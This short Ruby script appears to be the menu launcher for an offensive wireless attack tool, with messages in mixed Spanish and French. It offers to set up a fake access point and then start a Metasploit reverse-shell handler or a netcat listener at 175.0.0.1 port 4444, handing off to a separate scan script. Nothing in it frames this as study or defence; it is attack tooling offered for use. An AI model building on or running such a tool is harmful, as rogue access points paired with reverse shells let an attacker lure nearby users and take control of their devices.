#!/usr/bin/env ruby
require "highline/import"
require 'open3'
require 'monitor'
require './berate'


puts 'Elige un numéro (1,2 o 3)'
puts "\e[1;32m[*] Opcion 1: crear fake AP y despuès metasploit (configuracion reverse shell por defecto)\e[0m"
puts "\e[1;32m[*] Opcion 2: crear fake AP y despuès netcat (IP: 175.0.0.1 et puerto por defecto: 4444) \e[0m"
puts "\e[1;32m[*] Opcion 3: salir\e[0m"

choice = gets.chomp
case choice
when '1'
  puts 'Metasploit se iniciara despuès del fake AP... (opcion reverse shell por defecto: LHOST: 175.0.0.1, LPORT: 4444)'
`touch metasploit.txt`
system"ruby scan2g.rb"
when '2'
  puts 'Netcat se iniciara despuès del fake AP (puerto por defecto: 4444)'
`touch netcat.txt`
system"ruby scan2g.rb"
when '3'
  puts 'BYE...'
  exit
else
  puts "\e[1;31m[*] ERROR: elige un numéro (1,2 ou 3) !\e[0m"
end
